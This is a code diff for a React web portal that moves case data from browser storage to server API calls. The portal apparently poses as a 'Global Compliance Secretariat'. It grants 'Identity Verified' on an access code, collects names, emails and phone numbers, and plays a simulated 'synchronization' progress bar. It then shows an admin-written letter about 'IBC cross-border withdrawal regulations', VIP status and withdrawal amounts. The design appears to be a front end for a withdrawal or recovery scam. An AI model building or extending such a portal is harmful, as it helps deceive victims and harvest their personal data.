@@ -22,12 +22,14 @@ interface Case {
   id: string;
   accessCode: string;
   status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
-  user?: {
-    name: string;
-    email: string;
-    mobile: string;
-  };
-  adminData?: AdminData;
+  userName?: string;
+  userEmail?: string;
+  userMobile?: string;
+  vipStatus?: string;
+  username?: string;
+  withdrawalAmount?: string;
+  withdrawalBatches?: string;
+  physilocal0?: string;
 }
 
 export default function SecurePortal() {
@@ -60,16 +62,22 @@ export default function SecurePortal() {
   useEffect(() => {
     if (viewState !== 'sync' || !currentCase) return;
 
-    const interval = setInterval(() => {
-      const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
-      const updatedCase = cases.find(c => c.id === currentCase.id);
-      
-      if (updatedCase && updatedCase.status === 'active') {
-        setCurrentCase(updatedCase);
-        // Wait a moment to show 100% before transitioning
-        setSyncProgress(100);
-        setSyncStatusText("Synchronization Complete.");
-        setTimeout(() => setViewState('letter'), 1000);
+    const interval = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/cases/access/${currentCase.accessCode}`);
+        if (response.ok) {
+          const updatedCase = await response.json();
+          
+          if (updatedCase.status === 'active') {
+            setCurrentCase(updatedCase);
+            // Wait a moment to show 100% before transitioning
+            setSyncProgress(100);
+            setSyncStatusText("Synchronization Complete.");
+            setTimeout(() => setViewState('letter'), 1000);
+          }
+        }
+      } catch (error) {
+        console.error('Failed to poll case status:', error);
       }
     }, 2000);
 
@@ -80,55 +88,85 @@ export default function SecurePortal() {
   // HANDLERS
   // ------------------------------------------------------------------
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
-    const foundCase = cases.find(c => c.accessCode === accessCode && c.status !== 'completed');
-
-    if (foundCase) {
-      setCurrentCase(foundCase);
-      // If already registered, go to sync or letter
-      if (foundCase.status === 'active') setViewState('letter');
-      else if (foundCase.status === 'syncing') setViewState('sync');
-      else setViewState('register');
+    try {
+      const response = await fetch(`/api/cases/access/${accessCode}`);
       
-      toast({
-        title: "Identity Verified",
-        description: "Secure session established.",
-        className: "bg-green-50 border-green-200 text-green-900",
-      });
-    } else {
+      if (response.ok) {
+        const foundCase = await response.json();
+        
+        if (foundCase.status !== 'completed') {
+          setCurrentCase(foundCase);
+          // If already registered, go to sync or letter
+          if (foundCase.status === 'active') setViewState('letter');
+          else if (foundCase.status === 'syncing') setViewState('sync');
+          else setViewState('register');
+          
+          toast({
+            title: "Identity Verified",
+            description: "Secure session established.",
+            className: "bg-green-50 border-green-200 text-green-900",
+          });
+        } else {
+          toast({
+            variant: "destructive",
+            title: "Access Denied",
+            description: "This case has been completed.",
+          });
+        }
+      } else {
+        toast({
+          variant: "destructive",
+          title: "Access Denied",
+          description: "Invalid clearance code provided.",
+        });
+      }
+    } catch (error) {
       toast({
         variant: "destructive",
-        title: "Access Denied",
-        description: "Invalid clearance code provided.",
+        title: "Connection Error",
+        description: "Unable to verify credentials.",
       });
     }
   };
 
-  const handleRegister = (e: React.FormEvent) => {
+  const handleRegister = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!currentCase) return;
 
-    const updatedCase: Case = {
-      ...currentCase,
-      status: 'syncing',
-      user: {
-        name: regName,
-        email: regEmail,
-        mobile: regMobile
-      }
-    };
+    try {
+      const response = await fetch(`/api/cases/${currentCase.id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          status: 'syncing',
+          userName: regName,
+          userEmail: regEmail,
+          userMobile: regMobile
+        })
+      });
 
-    // Update LocalStorage
-    const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
-    const newCases = cases.map(c => c.id === currentCase.id ? updatedCase : c);
-    localStorage.setItem('ibc_cases', JSON.stringify(newCases));
-    
-    setCurrentCase(updatedCase);
-    setViewState('sync');
-    startSyncSimulation();
+      if (response.ok) {
+        const updatedCase = await response.json();
+        setCurrentCase(updatedCase);
+        setViewState('sync');
+        startSyncSimulation();
+      } else {
+        toast({
+          variant: "destructive",
+          title: "Registration Failed",
+          description: "Unable to complete registration.",
+        });
+      }
+    } catch (error) {
+      toast({
+        variant: "destructive",
+        title: "Connection Error",
+        description: "Unable to save registration.",
+      });
+    }
   };
 
   const startSyncSimulation = () => {
@@ -154,23 +192,40 @@ export default function SecurePortal() {
 
   const handleSubmit = async () => {
     setIsSubmitting(true);
-    await new Promise(resolve => setTimeout(resolve, 2000));
 
-    if (currentCase) {
-      const updatedCase: Case = {
-        ...currentCase,
-        status: 'completed',
-        // Store submission details inside the case for simplicity here
-        // In real app, this might be a separate table linked by ID
-      };
-      const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
-      const newCases = cases.map(c => c.id === currentCase.id ? updatedCase : c);
-      localStorage.setItem('ibc_cases', JSON.stringify(newCases));
+    if (currentCase && selectedOption) {
+      try {
+        const response = await fetch(`/api/cases/${currentCase.id}`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            status: 'completed',
+            selectedOption: selectedOption,
+            submittedAt: new Date().toISOString()
+          })
+        });
+
+        if (response.ok) {
+          setIsSubmitting(false);
+          setIsConfirming(false);
+          setViewState('success');
+        } else {
+          toast({
+            variant: "destructive",
+            title: "Submission Failed",
+            description: "Unable to submit selection.",
+          });
+          setIsSubmitting(false);
+        }
+      } catch (error) {
+        toast({
+          variant: "destructive",
+          title: "Connection Error",
+          description: "Unable to submit selection.",
+        });
+        setIsSubmitting(false);
+      }
     }
-    
-    setIsSubmitting(false);
-    setIsConfirming(false);
-    setViewState('success');
   };
 
   // ------------------------------------------------------------------
@@ -323,7 +378,13 @@ export default function SecurePortal() {
   // ------------------------------------------------------------------
   // LETTER VIEW (Using Admin Data)
   // ------------------------------------------------------------------
-  const adminData = currentCase?.adminData;
+  const adminData = currentCase ? {
+    vipStatus: currentCase.vipStatus,
+    username: currentCase.username,
+    withdrawalAmount: currentCase.withdrawalAmount,
+    withdrawalBatches: currentCase.withdrawalBatches,
+    physilocal0: currentCase.physilocal0
+  } : undefined;
 
   return (
     <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-blue-100">
@@ -377,7 +438,7 @@ export default function SecurePortal() {
                  <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Global Compliance Secretariat</p>
               </div>
               <div className="prose prose-slate text-slate-700 max-w-none text-sm leading-relaxed">
-                <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear {currentCase?.user?.name || "Client"},</p>
+                <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear {currentCase?.userName || "Client"},</p>
                 <p className="mb-4">
                   We acknowledge the successful completion of your re-authentication procedure. In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account <strong>{adminData?.username}</strong>.
                 </p>
